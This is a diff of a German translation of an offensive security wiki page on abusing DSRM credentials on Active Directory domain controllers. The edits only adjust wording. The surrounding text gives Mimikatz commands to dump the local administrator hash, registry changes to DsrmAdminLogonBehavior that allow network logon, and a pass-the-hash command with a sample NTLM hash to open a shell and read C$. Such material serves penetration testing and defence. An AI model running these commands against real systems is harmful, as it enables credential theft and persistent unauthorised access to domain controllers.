@@ -2,7 +2,7 @@
 
 # DSRM-Anmeldeinformationen
 
-Es gibt ein **lokales Administratorkonto** in jedem **DC**. Mit Administratorrechten auf diesem Rechner können Sie mimikatz verwenden, um den **Hash des lokalen Administrators** zu **dumpen**. Dann modifizieren Sie eine Registrierung, um dieses Passwort zu **aktivieren**, damit Sie remote auf diesen lokalen Administratorkonto zugreifen können.\
+Es gibt ein **lokales Administrator**-Konto in jedem **DC**. Mit Administratorrechten auf diesem Rechner können Sie mimikatz verwenden, um den **Hash des lokalen Administrators** zu **dumpen**. Dann modifizieren Sie eine Registrierung, um dieses Passwort zu **aktivieren**, damit Sie remote auf diesen lokalen Administratorbenutzer zugreifen können.\
 Zuerst müssen wir den **Hash** des **lokalen Administrators** im DC **dumpen**:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
@@ -13,7 +13,7 @@ Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-Dann können Sie mit einem PTH **den Inhalt von C$ auflisten oder sogar eine Shell erhalten**. Beachten Sie, dass für die Erstellung einer neuen PowerShell-Sitzung mit diesem Hash im Speicher (für den PTH) **die "Domain", die verwendet wird, nur der Name der DC-Maschine ist:**
+Dann können Sie mit einem PTH **den Inhalt von C$ auflisten oder sogar eine Shell erhalten**. Beachten Sie, dass für die Erstellung einer neuen PowerShell-Sitzung mit diesem Hash im Speicher (für den PTH) **die "Domäne", die verwendet wird, nur der Name der DC-Maschine ist:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
